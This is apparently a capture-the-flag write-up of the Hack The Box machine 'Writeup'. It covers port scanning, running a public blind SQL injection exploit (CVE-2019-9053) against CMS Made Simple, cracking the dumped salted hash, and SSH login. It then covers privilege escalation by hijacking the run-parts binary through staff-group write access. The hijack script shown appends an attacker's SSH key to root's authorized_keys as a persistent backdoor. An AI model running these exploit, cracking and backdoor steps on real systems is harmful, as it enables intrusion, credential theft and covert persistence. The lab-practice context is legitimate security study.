---
description: >-
  Writeup is an easy difficulty Linux box with DoS protection in place to
  prevent brute forcing. A CMS susceptible to a SQL injection vulnerability is
  found, which is leveraged to gain user credentials.
---

# Write Up

#### Skills Learned

* Path hijacking
* Process enumeration

## Port Scan

Run a port scan with nmap to see target open ports

```bash
nmap -T4 -A -p- --min-rate 1000 --open -oN port_scan.txt 10.10.10.138 
```

```bash
Nmap scan report for 10.10.10.138
Host is up (0.028s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u1 (protocol 2.0)
| ssh-hostkey: 
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-title: Nothing here yet.
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-server-header: Apache/2.4.25 (Debian)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|specialized
Running (JUST GUESSING): Linux 5.X|4.X|2.6.X (95%), Crestron 2-Series (86%)
OS CPE: cpe:/o:linux:linux_kernel:5.0 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:crestron:2_series
Aggressive OS guesses: Linux 5.0 (95%), Linux 4.15 - 5.8 (90%), Linux 5.0 - 5.4 (90%), Linux 5.3 - 5.4 (89%), Linux 2.6.32 (89%), Linux 5.0 - 5.5 (88%), Crestron XPanel control system (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   27.12 ms 10.10.14.1
2   27.86 ms 10.10.10.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.27 seconds

```

## Enumeration

Go in http page on port 80.

<figure><img src="../../../.gitbook/assets/image (156).png" alt=""><figcaption></figcaption></figure>

We can see that there is a mail and domain: **jkr@writeup.htm.**

Now go in a disallowed entry found in a _robots.txt_ file.

<figure><img src="../../../.gitbook/assets/image (157).png" alt=""><figcaption></figcaption></figure>

In this URL we have a webpage with some HTB write up. I have notice that in the url there is a variable that could be injectible

<figure><img src="../../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

:( The  field is not injectable.

We could try to understand the technology used by created this website.\
Looking at the source code, one can see that the **Generator** meta tag indicated that the **CMS Made Simple** was used to create this website.

<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

## Exploitation



Now, we can check if there are public exploits or vulnerabilities for this CMS.

### CVE-2019-9053 SQLi in CMS Made simple

> The CVE-2019-9053 exploit a Blind SQL injection vulnerability in CMS Made Simple.  It allow to brute force salt password, email, username and password from internal DB using a dictonary of characters and the response time of a specific query.&#x20;

This CVE was released in 2019, the same year oas the version of CMS (Read Copyright 2004-2019). So try it out and let's hope so.&#x20;

{% embed url="https://www.exploit-db.com/exploits/46635" %}

```bash
# download the exploit from exploit-db
searchploit -m 46635
```

```bash
# read and run the exploit
./46635.py -u 'http://writeup.htb/writeup/'
```

The exploit works.

<figure><img src="../../../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
salt: 5a599ef579066807

username: jkr

email: jkr@writeup.htb

password: 62def4866937f08cc13bab43bb14e6f7
{% endhint %}

### Crack the hash

We can detect the format of the hash with John The ripper and crack the password with salt with hashca&#x74;_._

```bash
# write the HASH:SALT in a file
echo "62def4866937f08cc13bab43bb14e6f7:5a599ef579066807" > hash

# detect hash format with john
john hash
```

It's a MD5 hash. Crack with hashcat.

```bash
# use -m 20 to crack a MD5 hash with salt
hashcat -m 20 hash /usr/share/wordlists/rockyou.txt

# results
62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9
```

{% hint style="success" %}
Password clean: raykayjay9
{% endhint %}

### SSH Login

Now that we have the credentials, let's try to logging in via SSH.

```bash
ssh jkr@10.10.10.138
password: raykayjay9
```

### user.txt

We're in! Print the user flag and move on.&#x20;

```bash
jkr@writeup:~$ cat user.txt 
```

## Privilege Escalation

Then i tried some basic PrivEsc methodologies, but found nothing. I tried running the script LinEnum.sh in hopes of finding something. In the input there is a interessing thing about the enumeration of user/group.

<figure><img src="../../../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

I did some research on this group and found this on the Debian wiki:

<figure><img src="../../../.gitbook/assets/image (161).png" alt=""><figcaption></figcaption></figure>

This means that we have privilege to create a executable in /bin folder, and if there is already one created by root we can "override" it.

To possibily check the processes run by the root user, I came across a tool that allows you to see all the processes on the machine without privileges.  This tool is called _**pspy**_

> **pspy** is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs.
>
> [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

Download it to the kali machine and transfer executable to the target with python http server.&#x20;

```bash
# kali machine
wget https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy32
python3 -m http.server 80
```

```bash
# target machine
chmod +x pspy32
./pspy32
```

We can see that when I access the target machine via SSH we have an executable running in the _/bin_ folder, called "run-parts". Now, we can use the privilege of the "staff" group to create a new execuble with the same name that will allow us to run a root shell.

<figure><img src="../../../.gitbook/assets/image (162).png" alt=""><figcaption></figcaption></figure>

```bash
# check the full path 
which run-parts

> /bin/run-parts
```

Now that we know exactly path, we can create a new executle to "ovverite" the original.

### Percistance with SSH root connection

Go to _/usr/local/bin_ folder and lets create a executable with same name.

```bash
cd /usr/local/bin
vi run-parts
```

Now I want to try to create a executable that creates an SSH connection as root and gives me a persistance on the target machine.

First, generate a **ssh-key** on kali machine (you must be root user to gen correct keys).

```bash
# generate ssh key
sudo su
ssh-keygen -f writeup 
# -f: print in output files
```

This command generate the private key file ('writeup') and public key file (writeup.pub).\
Copy the public key and paste it on the executable.

> For more details on the technique to set up reverse ssh as root on the target machine, see this guide:\
> [https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server#copying-your-public-key-manually](https://www.digitalocean.com/community/tutorials/how-to-configure-ssh-key-based-authentication-on-a-linux-server#copying-your-public-key-manually)&#x20;



{% code title="run-parts" overflow="wrap" lineNumbers="true" %}
```bash
#!/bin/bash

touch letzgoski.miao # check if the script run 

mkdir ~/.ssh # create ssh folder as root user
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEaFzsDWFZo76CM2/5+ZkWuJqrWCPbN8wlQfx3rUKpu/ root@kali' >> ~/.ssh/authorized_keys # paste the pub key into authorized_keys file
chmod 600 ~/.ssh/authorized_keys # gives file permissions  
```
{% endcode %}

Once you have saved the executable, you need to give it permission to execute it.

```bash
chmod +x run-parts
```

```bash
# connect via SSH with user jkr
ssh jkr@10.10.10.138
```

Now that the executable has done the actions and we changes the priv key permissions, we can try to connect via ssh as root using priv key.&#x20;

```bash
# changes priv key permission
chmod 600 writeup
```

```bash
# connect to target as root
ssh -i writeup root@10.10.10.138
```

> This executable creates an .ssh folder in root directory, and then copies our public key into authorized\_keys file, allows us to connect via ssh connection to target machine using our private keys.
>
> When we connect one more time via ssh, the executle performs all the actions and then we can try to connect from our machine to target machine using the private key generate earlier.

### root.txt

We are root! Lets print the flag

```bash
root@writeup:~$ cat root.txt 
```
